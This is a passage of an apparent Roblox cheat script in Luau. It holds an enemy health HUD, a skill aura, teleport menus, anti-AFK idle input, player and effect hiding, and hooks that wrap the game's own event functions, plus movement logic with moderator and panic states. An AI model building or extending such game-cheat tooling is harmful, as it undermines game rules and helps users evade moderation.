        local text=HttpService:JSONEncode(payload)
        local generation=storage and storage.Generation or 0
        local changed=text~=lastSavedPayload or generation~=lastSavedStorageGeneration
        if not changed then local readable,disk=pcall(readfile,configPath);changed=not readable or disk~=text end
        if changed then writefile(configPath,text);lastSavedPayload=text;lastSavedStorageGeneration=generation end
        if sharedSettings then sharedSettings.Save(payload)end
    end)
    state.ConfigSaveError=not ok and tostring(reason)or nil
    state.AutoSaveStatus=ok and "Auto-save · saved"or "Auto-save · write failed"
    return ok
end
requestSave=function()
    if not(configReady and filePersistence and state.Running)or state.AutoSaveSuspended then return end
    lastSettingsEdit=os.clock();state.AutoSaveStatus="Auto-save · pending"
    if savePending then return end
    savePending=true
    task.defer(function()
        repeat task.wait(.15)until not state.Running or os.clock()-lastSettingsEdit>=.6
        savePending=false
        if state.Running then state.SaveNow()end
    end)
end
function state.SetAutoExplore()state.AutoExplore=false;requestSave()end
function state.SetThreat()state.Threat=3;state.BurstProgress=0;requestSave()end
state.SetThreat()
local healthHUD=(function()
-- BEGIN BUNDLED ENEMY HEALTH
-- Health subscriptions mark rows dirty; one projection pass coalesces hit bursts.
return function(ctx)
    local state=ctx.State
    local time=ctx.Now or os.clock
    local rows,byHealth={},{}
    local subscriptions={}
    local stopped=false
    local sequence,paintDue,rankDue=0,0,0
    local focus
    local dirtyLayout,dirtySnapshot=true,true
    local api={Rows=rows,Count=0}
    for _,object in ipairs(ctx.Parent:GetChildren())do
        if object.Name=="EnemyHealth"and object:IsA("ScrollingFrame")then object:Destroy()end
    end
    local function make(class,properties,parent)return ctx.Create(class,properties,parent)end
    local root=make("ScrollingFrame",{Name="EnemyHealth",Position=UDim2.new(.5,0,.7,0),AnchorPoint=Vector2.new(.5,.5),
        Size=UDim2.fromOffset(280,52),Visible=false,Active=true,BackgroundTransparency=1,BorderSizePixel=0,
        CanvasSize=UDim2.new(),ScrollBarThickness=0,ScrollingDirection=Enum.ScrollingDirection.Y,ClipsDescendants=true},ctx.Parent)
    api.Root=root
    make("UIListLayout",{SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,5)},root)
    local function subscribe(signal,fn)
        local value=signal:Connect(fn);subscriptions[#subscriptions+1]=value;return value
    end
    function api.Number(value)
        local digits=string.format("%.0f",math.floor(math.max(0,value)))
        local parts={}
        while #digits>3 do table.insert(parts,1,digits:sub(-3));digits=digits:sub(1,-4)end
        table.insert(parts,1,digits)
        return table.concat(parts,",")
    end
    local function viewport()
        local size=ctx.Viewport and ctx.Viewport()or ctx.Parent.AbsoluteSize
        if size.X<=0 or size.Y<=0 then return Vector2.new(1280,720)end
        return size
    end
    local function keepOnScreen()
        local view=viewport()
        local p=root.Position
        local x=p.X.Scale*view.X+p.X.Offset
        local y=p.Y.Scale*view.Y+p.Y.Offset
        local halfX,halfY=root.Size.X.Offset/2,root.Size.Y.Offset/2
        local boundedX=math.clamp(x,halfX+4,math.max(halfX+4,view.X-halfX-4))
        local boundedY=math.clamp(y,halfY+4,math.max(halfY+4,view.Y-halfY-4))
        if boundedX~=x or boundedY~=y then root.Position=UDim2.new(p.X.Scale,p.X.Offset+boundedX-x,p.Y.Scale,p.Y.Offset+boundedY-y)end
    end
    local function remove(mob)
        local row=rows[mob]
        if not row then return end
        rows[mob]=nil
        if byHealth[row.Health]==row then byHealth[row.Health]=nil end
        for _,connection in ipairs(row.Connections or {})do pcall(function()connection:Disconnect()end)end
        if row.Tween then pcall(function()row.Tween:Cancel()end)end
        if row.Frame then pcall(function()row.Frame:Destroy()end)end
        dirtyLayout=true;dirtySnapshot=true
    end
    local function arrange()
        local list={};for _,row in pairs(rows)do if row.Frame then list[#list+1]=row end end
        table.sort(list,function(a,b)return a.Priority==b.Priority and a.Serial<b.Serial or a.Priority<b.Priority end)
        local compact=#list>1
        local width,height=compact and 244 or 280,compact and 42 or 52
        local fullHeight=math.max(height,#list*(height+5)-5)
        local maximum=math.max(52,math.min(360,math.floor(viewport().Y*.45)))
        root.Size=UDim2.fromOffset(width,math.min(fullHeight,maximum))
        root.CanvasSize=UDim2.fromOffset(0,fullHeight);root.ScrollBarThickness=fullHeight>maximum and 3 or 0
        root.Visible=#list>0;api.Count=#list;state.HealthHUDCount=#list
        for index,row in ipairs(list)do
            row.Frame.LayoutOrder=index;row.Frame.Size=UDim2.fromOffset(width,height)
            row.Name.Size=UDim2.fromOffset(width-20,15);row.Name.TextSize=compact and 11 or 12
            row.Track.Position=UDim2.fromOffset(10,compact and 22 or 25);row.Track.Size=UDim2.fromOffset(width-20,compact and 6 or 7)
            row.Numbers.Position=UDim2.fromOffset(10,compact and 30 or 35);row.Numbers.Size=UDim2.fromOffset(width-20,compact and 11 or 13)
            row.Numbers.TextSize=compact and 9 or 10
        end
        keepOnScreen();dirtyLayout=false
    end
    local function paint(row,initial)
        if stopped or not state.Running or not root.Parent or rows[row.Mob]~=row then return end
        local hp=math.max(0,row.Health.Value)
        row.ObservedMax=math.max(row.ObservedMax,hp)
        local maximum=math.max(1,row.Constrained and row.Health.MaxValue or row.MaximumValue and row.MaximumValue.Value or row.ObservedMax)
        local fraction=math.clamp(hp/maximum,0,1)
        if row.Tween then row.Tween:Cancel()end
        local fill={Size=UDim2.fromScale(fraction,1),BackgroundColor3=Color3.fromRGB(51,199,89)}
        if initial then row.Fill.Size=fill.Size;row.Fill.BackgroundColor3=fill.BackgroundColor3
        else row.Tween=ctx.TweenService:Create(row.Fill,TweenInfo.new(.22,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),fill);row.Tween:Play()end
        row.Numbers.Text=string.format("%s / %s HP · %.0f%%",api.Number(hp),api.Number(maximum),fraction*100)
        row.Current,row.Maximum=hp,maximum;row.Dirty=false
        row.DeadAt=hp<=0 and (row.DeadAt or time())or nil
        if row.Mob==focus or api.Count<=1 then state.ObservedHealth=hp;state.ObservedMaxHealth=maximum end
        state.HealthUpdates=(state.HealthUpdates or 0)+1;dirtySnapshot=true
    end
    local function visuals(row)
        row.Frame=make("Frame",{Name="Target_"..row.Serial,Size=UDim2.fromOffset(280,52),BackgroundColor3=Color3.fromRGB(42,42,44),BackgroundTransparency=0,BorderSizePixel=0},root)
        row.Frame:SetAttribute("TargetName",row.Mob.Name);ctx.Corner(row.Frame,14)
        make("UIStroke",{Color=Color3.fromRGB(255,255,255),Thickness=1,Transparency=.92},row.Frame)
        row.Name=make("TextLabel",{Name="Name",Text=row.Mob.Name,BackgroundTransparency=1,Position=UDim2.fromOffset(10,4),Font=Enum.Font.Gotham,TextSize=12,TextColor3=Color3.fromRGB(255,255,255),TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd},row.Frame)
        row.Track=make("Frame",{Name="Track",BackgroundColor3=Color3.fromRGB(24,24,26),BorderSizePixel=0},row.Frame);ctx.Corner(row.Track,3)
        row.Fill=make("Frame",{Name="Fill",Size=UDim2.fromScale(1,1),BackgroundColor3=Color3.fromRGB(51,199,89),BorderSizePixel=0},row.Track);ctx.Corner(row.Fill,3)
        row.Numbers=make("TextLabel",{Name="Values",BackgroundTransparency=1,Font=Enum.Font.Gotham,TextSize=10,TextColor3=Color3.fromRGB(161,161,170),TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd},row.Frame)
    end
    function api.Touch(mob)
        if stopped or not root.Parent or not state.Running or not mob or not mob.Parent then return end
        local existing=rows[mob]
        if existing then existing.LastAttack=time();return end
        local data=ctx.GetData(mob)
        if not data or not data.Health or data.Health.Value<=0 then return end
        if byHealth[data.Health]then byHealth[data.Health].LastAttack=time();return end
        sequence+=1
        local row={Mob=mob,Health=data.Health,Connections={},Serial=sequence,LastAttack=time(),ObservedMax=data.Health.Value,
            Priority=ctx.Priority and ctx.Priority(mob)or 3,MaximumValue=data.Entity:FindFirstChild("MaxHealth")}
        row.Constrained=row.Health:IsA("IntConstrainedValue")or row.Health:IsA("DoubleConstrainedValue")
        rows[mob]=row;byHealth[row.Health]=row
        visuals(row)
        if stopped or not root.Parent or not state.Running then remove(mob);return end
        local function changed()row.Dirty=true end
        row.Connections[#row.Connections+1]=row.Health:GetPropertyChangedSignal("Value"):Connect(changed)
        if row.Constrained then row.Connections[#row.Connections+1]=row.Health:GetPropertyChangedSignal("MaxValue"):Connect(changed)
        elseif row.MaximumValue and row.MaximumValue:IsA("ValueBase")then row.Connections[#row.Connections+1]=row.MaximumValue.Changed:Connect(changed)end
        row.Render=function()paint(row,false)end
        paint(row,true);dirtyLayout=true;arrange()
    end
    function api.Focus(mob)focus=mob end
    function api.Update(stamp)
        if stopped or not root.Parent then return end
        stamp=stamp or time();if stamp<paintDue then return end;paintDue=stamp+.12
        local ranking=stamp>=rankDue;if ranking then rankDue=stamp+.5 end
        for mob,row in pairs(rows)do
            local present=mob.Parent and row.Health.Parent and (not ctx.Present or ctx.Present(mob))
            if present and row.Dirty then paint(row,false)end
            local expired=row.DeadAt and stamp-row.DeadAt>.45
            local idle=stamp-row.LastAttack>1.4 and not(mob==focus and (state.SkillPreparing or state.SkillCastRunning))
            if expired or not row.DeadAt and (not present or idle)then remove(mob)
            elseif ranking and ctx.Priority then local rank=ctx.Priority(mob);if rank~=row.Priority then row.Priority=rank;dirtyLayout=true end end
        end
        if dirtySnapshot then
            local snapshot={};for mob,row in pairs(rows)do snapshot[#snapshot+1]={Name=mob.Name,Health=row.Current,MaxHealth=row.Maximum}end
            state.HealthHUDTargets=snapshot;dirtySnapshot=false
        end
        if dirtyLayout then arrange()end
    end
    local saved=ctx.Position
    if type(saved)=="table"and #saved==4 then
        local valid=true;for _,n in ipairs(saved)do if type(n)~="number"or n~=n or math.abs(n)>100000 then valid=false end end
        if valid then root.Position=UDim2.new(saved[1],saved[2],saved[3],saved[4]);keepOnScreen()end
    end
    local dragging
    subscribe(ctx.Parent:GetPropertyChangedSignal("AbsoluteSize"),function()dirtyLayout=true end)
    subscribe(root.InputBegan,function(input)
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then dragging={Input=input,Origin=input.Position,Position=root.Position}end
    end)
    subscribe(ctx.Input.InputChanged,function(input)
        if dragging and (input==dragging.Input or input.UserInputType==Enum.UserInputType.MouseMovement)then
            local delta=input.Position-dragging.Origin;local p=dragging.Position
            root.Position=UDim2.new(p.X.Scale,p.X.Offset+delta.X,p.Y.Scale,p.Y.Offset+delta.Y);keepOnScreen()
        end
    end)
    subscribe(ctx.Input.InputEnded,function(input)
        if dragging and (input==dragging.Input or input.UserInputType==Enum.UserInputType.MouseButton1 and dragging.Input.UserInputType==Enum.UserInputType.MouseButton1)then dragging=nil;if ctx.Save then ctx.Save()end end
    end)
    function api.Destroy(fromRoot)
        if stopped then return end
        stopped=true
        for _,connection in ipairs(subscriptions)do connection:Disconnect()end;table.clear(subscriptions)
        for mob in pairs(rows)do remove(mob)end
        table.clear(byHealth);api.Count=0;state.HealthHUDCount=0;state.HealthHUDTargets={}
        if not fromRoot then root:Destroy()end
    end
    subscribe(root.Destroying,function()api.Destroy(true)end)
    return api
end

-- END BUNDLED ENEMY HEALTH
end)()({State=state,Parent=gui,Create=create,Corner=corner,GetData=getMobData,TweenService=TweenService,Input=UserInputService,
    Position=configData.HealthHUDPosition,Save=requestSave,Priority=function(mob)return targetPriority.Rank(mob)end,
    Present=function(mob)return mob:IsDescendantOf(workspace)end})
enemyHUD=healthHUD.Root
local function trackHealth(mob)return healthHUD.Focus(mob)end
local skillToggle=uiButton("SkillAura","")
local skillDropdown=uiButton("SkillDropdown",state.SelectedSkill)
local skillList=controllerViews.New({Name="SkillOptions"})
local travelHeading=uiLabel("TravelHeading","")
local travelDropdown=uiButton("TeleportDropdown","")
local travelList=controllerViews.New({Name="TravelOptions"})
local AttackStats=require(ReplicatedStorage.Shared.Library.AttackStats)
local function refreshSkillChoices()state.SkillChoices=state.WeaponSkills and state.WeaponSkills.Choices()or {}end
local function setTravelStatus(message)state.TravelStatus=message end
local function setTravelOpen()end
state.TravelStatus="";state.SetTravelOpen=setTravelOpen
function state.SetSkillRange(value)state.SkillRange=math.clamp(math.floor(tonumber(value)or state.SkillRange),20,120)end
function state.SetSelectedSkill(name)return state.WeaponSkills and state.WeaponSkills.Select(name)or false end
function state.SetSkillAura(requested)
    if requested and state.StopEverything then return false end
    state.SkillAura=requested==true
    if state.AuraTouch then state.AuraTouch.Update()end
    if state.WakeSkillAura then state.WakeSkillAura()end
    if not state.SkillAura and state.CancelSkillAura then state.CancelSkillAura("Skill aura disabled")end
    state.SkillStatus=state.SkillAura and "Waiting for a nearby enemy"or "Skill aura is off"
    requestSave()
end
refreshSkillChoices()
state.UI={Root=gui,Content=content,SkillOptions=skillList,TravelOptions=travelList,Pages={},TabButtons={},BoostButtons={}}
local adapters={"AutoEquipBestSword","AtheonDodge","MiscSkillToggle","MiscSkillDropdown","MiscSkillOptions","BoostDropdown",
    "BoostOptions","PlayerSelector","PlayerOptions","TeleportPlayer","ViewPlayer","ViewInventory","PlayerInventory","PlayerMessage"}
for _,name in ipairs(adapters)do state.UI[name]=controllerViews.New({Name=name})end
for _,name in ipairs({"Main","Combat","Waves Defense","Auto Skill","Misc","Player","Utility","Speacial"})do
    state.UI.Pages[name]=controllerViews.New({Name=name})
end
function state.SetTab(name)state.UI.ActiveTab=name end
function state.SetAutoEquipBestSword(requested)
    state.AutoEquipBestSword=requested==true
    if state.ProgressionGearController then state.ProgressionGearController.Reset()end
    requestSave()
end
function state.SetAtheonDodge(requested)
    state.AtheonDodge=requested==true
    if not requested and state.AtheonDodgeController then state.AtheonDodgeController.Reset()end
    requestSave()
end
state.SetAutoEquipBestSword(restore.AutoEquipBestSword);state.SetAtheonDodge(restore.AtheonDodge)
state.SetTab(preference("ActiveTab","Main"))
state.MiscMenuMethods={Dismantle="openDismantle",Upgrade="openUpgrade",["The Forge"]="openCrystalForge"}
function state.OpenGameMenu(name)
    if state.StopEverything then return false,"Stop Everything is on"end
    local method=state.MiscMenuMethods[name]
    if type(GameUI[method])~="function"then return false,"Menu is unavailable"end
    local ok,reason=pcall(GameUI[method]);if not ok then state.LastMenuError=tostring(reason)end
    return ok,reason
end
do
    local attachAntiAFK=(function()
-- BEGIN BUNDLED ANTI AFK
-- Idle events acquire a short pulse lease; no polling worker is created.
return function(ctx)
    local result={Enabled=true,Pulses=0}
    local lease={Running=false,Due=0,Closed=false}
    local clock=ctx.Clock or os.clock
    local state=ctx.State
    state.AntiAfkStatus="Active · waiting for idle"
    local function onIdle()
        local stamp=clock()
        if lease.Closed or lease.Running or state.Running==false or stamp<lease.Due then return end
        lease.Running=true;lease.Due=stamp+20
        local success,reason=pcall(ctx.Pulse)
        lease.Running=false
        if lease.Closed or state.Running==false then return end
        if success then
            result.Pulses+=1
            state.LastAntiAfkError=nil
            state.AntiAfkStatus="Active · idle input sent"
        else
            state.LastAntiAfkError=tostring(reason)
            state.AntiAfkStatus="Idle input unavailable · retrying on next idle event"
        end
    end
    local subscription=ctx.Player.Idled:Connect(onIdle)
    function result.Destroy()
        if lease.Closed then return end
        lease.Closed=true;result.Enabled=false
        subscription:Disconnect();subscription=nil
        state.AntiAfkStatus="Stopped"
    end
    return result
end

-- END BUNDLED ANTI AFK
    end)()
    local input
    state.AntiAfk=attachAntiAFK({State=state,Player=player,Pulse=function()
        input=input or game:GetService("VirtualUser")
        pcall(input.CaptureController,input)
        local camera=workspace.CurrentCamera
        input:ClickButton2(Vector2.zero,camera and camera.CFrame or CFrame.new())
    end})
    local attachVisibility=(function()
-- BEGIN BUNDLED HIDE PLAYERS
-- Visibility is a reversible property overlay scoped to remote player roots.
return function(ctx)
    local api={BlockedEffects=0}
    local modes={Characters=false,Effects=false,Closed=false}
    local roster,roots,globalConnections,itemConnections,hooks={},{},{},{},{}
    local itemFolder
    local invisible=NumberSequence.new(1)
    local classes="BasePart,Decal,ParticleEmitter,Beam,Trail,Light,Highlight,BillboardGui,SurfaceGui,Humanoid,Sound"
    local function disconnect(list)
        for _,connection in pairs(list)do connection:Disconnect()end
        table.clear(list)
    end
    local function enabled()return not modes.Closed and (modes.Characters or modes.Effects)end
    local function restoreValue(layer,object)
        local before=layer.Values[object]
        layer.Values[object]=nil
        local guard=layer.Guards[object]
        if guard then guard:Disconnect();layer.Guards[object]=nil end
        if before then for property,value in pairs(before)do pcall(function()object[property]=value end)end end
    end
    local function release(root)
        local layer=roots[root]
        if not layer then return end
        roots[root]=nil;disconnect(layer.Connections)
        for object in pairs(layer.Values)do restoreValue(layer,object)end
        disconnect(layer.Guards)
    end
    local function properties(object)
        if modes.Characters then
            if object:IsA("BasePart")then return {Transparency=1,LocalTransparencyModifier=1,CastShadow=false}end
            if object:IsA("Decal")then return {Transparency=1}end
            if object:IsA("BillboardGui")or object:IsA("SurfaceGui")then return {Enabled=false}end
            if object:IsA("Humanoid")then return {DisplayDistanceType=Enum.HumanoidDisplayDistanceType.None}end
        end
        if object:IsA("ParticleEmitter")or object:IsA("Beam")or object:IsA("Trail")then return {Enabled=false,Transparency=invisible}end
        if object:IsA("Highlight")then return {Enabled=false}end
        if object:IsA("Light")then return {Brightness=0}end
        if object:IsA("Sound")then return {Volume=0}end
    end
    local function overlay(person,root)
        if not root or not enabled()or person==ctx.Players.LocalPlayer or roots[root]then return end
        local layer={Owner=person,Values={},Guards={},Connections={}}
        roots[root]=layer
        local function apply(object)
            if not enabled()or roots[root]~=layer or layer.Values[object]then return end
            local changes=properties(object)
            if not changes then return end
            local old={}
            for property,value in pairs(changes)do old[property]=object[property];object[property]=value end
            layer.Values[object]=old
            if changes.Enabled==false then
                layer.Guards[object]=object:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if enabled()and roots[root]==layer and layer.Values[object]and object.Enabled then object.Enabled=false end
                end)
            end
            if object:IsA("ParticleEmitter")then pcall(function()object:Clear()end)end
        end
        layer.Connections={root.DescendantAdded:Connect(apply),root.DescendantRemoving:Connect(function(object)restoreValue(layer,object)end)}
        for _,object in ipairs(root:QueryDescendants(classes))do apply(object)end
    end
    local function unwatch(person)
        local record=roster[person]
        if not record then return end
        roster[person]=nil;disconnect(record.Connections)
        if record.Character then release(record.Character)end
        if record.Items then release(record.Items)end
    end
    local function updateItems(person)
        local record=roster[person]
        if not record then return end
        local nextRoot=itemFolder and itemFolder:FindFirstChild(tostring(person.UserId))
        if record.Items==nextRoot then return end
        if record.Items then release(record.Items)end
        record.Items=nextRoot;overlay(person,nextRoot)
    end
    local function itemFolderChanged()
        local current=ctx.Workspace and ctx.Workspace:FindFirstChild("CharacterItems")
        if current==itemFolder then return end
        disconnect(itemConnections);itemFolder=current
        if current then
            itemConnections={current.ChildAdded:Connect(function(child)
                for person in pairs(roster)do if tostring(person.UserId)==child.Name then updateItems(person)end end
            end),current.ChildRemoved:Connect(function(child)
                for _,record in pairs(roster)do if record.Items==child then release(child);record.Items=nil end end
            end)}
        end
        for person in pairs(roster)do updateItems(person)end
    end
    local function watch(person)
        if not enabled()or person==ctx.Players.LocalPlayer or roster[person]then return end
        local record={Connections={}}
        roster[person]=record
        local function characterChanged(character)
            if record.Character then release(record.Character)end
            record.Character=character;overlay(person,character)
        end
        record.Connections={person.CharacterAdded:Connect(characterChanged),person.CharacterRemoving:Connect(function(character)
            release(character);if record.Character==character then record.Character=nil end
        end)}
        characterChanged(person.Character);updateItems(person)
    end
    local function owner(value)
        local kind=typeof(value)
        if kind~="Instance"and type(value)~="table"then return nil end
        if value==ctx.Players.LocalPlayer then return false end
        local localCharacter=ctx.Players.LocalPlayer.Character
        if kind=="Instance"and localCharacter and (value==localCharacter or value:IsDescendantOf(localCharacter))then return false end
        for person,record in pairs(roster)do
            if value==person then return true end
            if kind=="Instance"then
                for _,root in pairs({record.Character,record.Items})do if value==root or value:IsDescendantOf(root)then return true end end
            end
        end
        return nil
    end
    function api.IsOtherEffect(payload)
        if type(payload)~="table"then return owner(payload)==true end
        for _,field in ipairs({"Character","Player","SourceCharacter","SourcePlayer","Caster"})do
            local found=owner(payload[field]);if found~=nil then return found end
        end
        return false
    end
    local function cleanup()
        disconnect(globalConnections);disconnect(itemConnections);itemFolder=nil
        for _,hook in ipairs(hooks)do if hook.Service.DoEffect==hook.Wrapper then hook.Service.DoEffect=hook.Previous end end
        table.clear(hooks)
        for person in pairs(roster)do unwatch(person)end
        for root in pairs(roots)do release(root)end
    end
    local function initialize()
        globalConnections={ctx.Players.PlayerAdded:Connect(watch),ctx.Players.PlayerRemoving:Connect(unwatch)}
        if ctx.Workspace then
            globalConnections[#globalConnections+1]=ctx.Workspace.ChildAdded:Connect(function(child)if child.Name=="CharacterItems"then itemFolderChanged()end end)
            globalConnections[#globalConnections+1]=ctx.Workspace.ChildRemoved:Connect(function(child)if child==itemFolder then itemFolderChanged()end end)
        end
        itemFolderChanged()
        for _,person in ipairs(ctx.Players:GetPlayers())do watch(person)end
        for _,service in ipairs(ctx.EffectServices or {})do
            if type(service.DoEffect)=="function"then
                local old=service.DoEffect
                local wrapper=function(name,payload,...)
                    if enabled()and name~="Damage Text"and api.IsOtherEffect(payload)then api.BlockedEffects+=1;return end
                    return old(name,payload,...)
                end
                service.DoEffect=wrapper;hooks[#hooks+1]={Service=service,Previous=old,Wrapper=wrapper}
            end
        end
    end
    local function mode(characters,effects)
        if modes.Closed then return false end
        characters,effects=characters==true,effects==true
        if modes.Characters==characters and modes.Effects==effects then return true end
        cleanup();modes.Characters=characters;modes.Effects=effects
        if enabled()then initialize()end
        return true
    end
    function api.Set(value)return mode(value,modes.Effects)end
    function api.SetEffects(value)return mode(modes.Characters,value)end
    function api.Destroy()if modes.Closed then return end;modes.Closed=true;cleanup()end
    return api
end

-- END BUNDLED HIDE PLAYERS
    end)()
    local attachBoosts=(function()
-- BEGIN BUNDLED PERFORMANCE BOOST
-- Effective booster policy is derived from individual selections plus one aggregate mode.
return function(ctx)
    local state=ctx.State
    local api={Names={"No damage text","No damage particles","Delete dead mobs","No vel obtained in chat","Hide players","Hide effects","Delete map","Remove animations","Disable rendering","Limit FPS","Remove everything"}}
    local selected,known={},{}
    for _,name in ipairs(api.Names)do known[name]=true;selected[name]=ctx.Options and ctx.Options[name]==true end
    state.PerformanceBoosters=selected
    local owned={Closed=false,Visible=false,Rendering=false,FPS=false}
    local initialCap
    if ctx.GetFPS then local ok,value=pcall(ctx.GetFPS);if ok and type(value)=="number"then initialCap=value end end
    local transparent=NumberSequence.new(1)
    local particles={Folder=nil,Connections={},Values={}}
    local function desired(name)return selected[name]==true or selected["Remove everything"]==true end
    local function live(name)return not owned.Closed and not ctx.Paused and state and state.Running and not state.StopEverything and desired(name)end
    local function releaseParticle(item)
        local before=particles.Values[item]
        if not before then return end
        particles.Values[item]=nil
        pcall(function()item.Enabled=before[1];item.Transparency=before[2]end)
    end
    local function hideParticle(item)
        if not live("No damage particles")or particles.Values[item]then return end
        if not(item:IsA("ParticleEmitter")or item:IsA("Beam")or item:IsA("Trail"))then return end
        particles.Values[item]={item.Enabled,item.Transparency}
        item.Enabled=false;item.Transparency=transparent
        if item:IsA("ParticleEmitter")then pcall(function()item:Clear()end)end
    end
    local function detachParticles()
        for _,connection in ipairs(particles.Connections)do connection:Disconnect()end
        table.clear(particles.Connections)
        for item in pairs(particles.Values)do releaseParticle(item)end
        particles.Folder=nil
    end
    local function syncParticles()
        local folder=desired("No damage particles")and ctx.Workspace:FindFirstChild("HitEffects")or nil
        if folder==particles.Folder then return end
        detachParticles();particles.Folder=folder
        if not folder then return end
        particles.Connections={folder.DescendantAdded:Connect(hideParticle),folder.DescendantRemoving:Connect(releaseParticle)}
        for _,item in ipairs(folder:QueryDescendants("ParticleEmitter,Beam,Trail"))do hideParticle(item)end
    end
    local function corpse(payload)
        local mob=payload[2]
        local folder=ctx.Workspace:FindFirstChild("Mobs")
        if typeof(mob)~="Instance"or not folder or not mob:IsA("Model")or not mob:IsDescendantOf(folder)then return false end
        local entity=mob:FindFirstChild("Entity")
        local health=entity and entity:FindFirstChild("Health")
        if not health or health.Value>0 then return false end
        mob:Destroy();return true
    end
    local hooks={}
    local function hook(key,service,predicate,enabled)
        local lease=hooks[key]
        if not enabled then
            if lease and service.ServerEvent==lease.Wrapper then service.ServerEvent=lease.Before end
            hooks[key]=nil;return
        end
        if lease and service.ServerEvent==lease.Wrapper then return end
        local previous=service.ServerEvent
        local wrapper=function(payload,...)
            if not owned.Closed and predicate(payload)then return end
            return previous(payload,...)
        end
        service.ServerEvent=wrapper;hooks[key]={Before=previous,Wrapper=wrapper,Service=service}
    end
    local function graphicsPolicy(payload)
        if type(payload)~="table"then return false end
        if payload[1]=="Damage Text"and live("No damage text")then return true end
        return payload[1]=="KillFade"and live("Delete dead mobs")and corpse(payload)
    end
    local function uiPolicy(payload)return type(payload)=="table"and payload[2]=="VelObtained"and live("No vel obtained in chat")end
    local function syncFPS()
        local limited=selected["Limit FPS"]and not selected["Remove everything"]
        if limited or owned.FPS then
            assert(ctx.SetFPS and initialCap~=nil,"FPS cap control is unavailable")
            ctx.SetFPS(limited and (owned.Visible and 60 or 15)or initialCap)
        end
        owned.FPS=limited==true
    end
    local effects={
        ["Disable rendering"]=function()ctx.SetRendering(not desired("Disable rendering"));owned.Rendering=desired("Disable rendering")end,
        ["Limit FPS"]=syncFPS,
        ["Hide players"]=function()assert(ctx.PlayerVisibility and ctx.PlayerVisibility.Set(desired("Hide players")),"Player visibility is unavailable")end,
        ["Hide effects"]=function()assert(ctx.PlayerVisibility and ctx.PlayerVisibility.SetEffects(desired("Hide effects")),"Effect visibility is unavailable")end,
        ["Delete map"]=function()if state.MapDeletion then state.MapDeletion.Set(desired("Delete map"))end end,
        ["Remove animations"]=function()if state.AnimationRemoval then state.AnimationRemoval.Set(desired("Remove animations"))end end,
        ["No damage particles"]=syncParticles,
    }
    local function sync(name)
        if name=="Remove everything"then
            for _,key in ipairs({"Disable rendering","Limit FPS","Hide players","Hide effects","Delete map","Remove animations","No damage particles"})do effects[key]()end
        elseif effects[name]then effects[name]()end
        if name=="Remove everything"or name=="No damage text"or name=="Delete dead mobs"then
            hook("Graphics",ctx.Graphics,graphicsPolicy,desired("No damage text")or desired("Delete dead mobs"))
        end
        if name=="Remove everything"or name=="No vel obtained in chat"then hook("UI",ctx.UI,uiPolicy,desired("No vel obtained in chat"))end
    end
    local rootConnection=ctx.Workspace.ChildAdded:Connect(function(item)
        if item.Name=="HitEffects"and live("No damage particles")then syncParticles()end
    end)
    function api.SetUIVisible(value)
        value=value==true
        if owned.Closed or owned.Visible==value then return end
        owned.Visible=value
        if owned.FPS then local ok,reason=pcall(syncFPS);if not ok then state.LastBoostError=tostring(reason)end end
    end
    function api.Set(name,value)
        if owned.Closed or ctx.Paused or not known[name]or state.StopEverything then return false end
        local old=selected[name];selected[name]=value==true
        local applied,reason=pcall(sync,name)
        if not applied then selected[name]=old;pcall(sync,name);state.LastBoostError=tostring(reason);return false end
        if ctx.Changed then ctx.Changed()end
        return true
    end
    function api.Destroy()
        if owned.Closed then return end
        owned.Closed=true;rootConnection:Disconnect();detachParticles()
        for key,lease in pairs(hooks)do hook(key,lease.Service,nil,false)end
        for _,object in pairs({state.MapDeletion,state.AnimationRemoval,ctx.PlayerVisibility})do if object then pcall(object.Destroy)end end
        if owned.Rendering then pcall(ctx.SetRendering,true)end
        if owned.FPS then pcall(ctx.SetFPS,initialCap)end
        state=nil;ctx.State=nil;ctx.Changed=nil;ctx.PlayerVisibility=nil
    end
    if not ctx.Paused and not state.StopEverything then
        for _,name in ipairs(api.Names)do if selected[name]then selected[name]=false;api.Set(name,true)end end
    end
    return api
end

-- END BUNDLED PERFORMANCE BOOST
    end)()
    local playerVisibility=attachVisibility({Players=Players,Workspace=workspace,EffectServices={require(services.Graphics),require(services.SkillEffects)}})
    state.PlayerVisibility=playerVisibility
    local getCap=type(getfpscap)=="function"and getfpscap or function()
        local value=UserSettings():GetService("UserGameSettings").FramerateCap
        return type(value)=="number"and value or value.Value
    end
    state.PerformanceBoost=attachBoosts({State=state,Workspace=workspace,Graphics=require(services.Graphics),UI=GameUI,
        Options=restore.PerformanceBoosters,PlayerVisibility=playerVisibility,GetFPS=getCap,
        SetFPS=type(setfpscap)=="function"and setfpscap or nil,
        SetRendering=function(enabled)RunService:Set3dRenderingEnabled(enabled)end,Changed=requestSave})
    function state.SetPerformanceBoost(name,enabled)return state.PerformanceBoost.Set(name,enabled)end
end
state.MovementOwnership=(function()
-- BEGIN BUNDLED MOVEMENT OWNER
-- Evaluate controller policies anew; movement ownership has no stale lease.
return function(state)
    local api={Owner="Manual",ChangedAt=0,Transitions=0}
    local rules={
        {"Stopped",function()return state.Running==false or state.StopEverything end},
        {"Moderator",function()return state.ModeratorBlocking end},
        {"Safety",function()return state.SafeModePanic end},
        {"Friend",function()return state.AutoJoinFriendHolding end},
        {"Floor travel",function()return state.AutomationTeleporting end},
        {"Trade",function()return state.AutoTradeBusy end},
        {"Arena travel",function()return state.TravelBusy or state.MultiSpotOwnsTravel end},
        {"Dodge",function()return state.Dodging or state.BlackoutHolding end},
        {"Recovery",function(now)return state.Recovering or now<(state.FarmPauseUntil or 0)end},
        {"Farm",function()return state.AutoFarm end},
    }
    function api.Resolve(now)
        local owner="Manual"
        for _,rule in ipairs(rules)do if rule[2](now)then owner=rule[1];break end end
        if owner~=api.Owner then api.Owner=owner;api.Transitions+=1;api.ChangedAt=now end
        state.MovementOwner=owner;return owner
    end
    function api.CanFarm(now)
        local owner=api.Resolve(now)
        return owner=="Manual"or owner=="Farm"
    end
    return api
end

-- END BUNDLED MOVEMENT OWNER
end)()(state)
local movementRoot, movementHumanoid, previousAutoRotate, previousPlatformStand
local movementAttachment, positionAlign, orientationAlign
local collisionParts = {}
local characterPartConnection
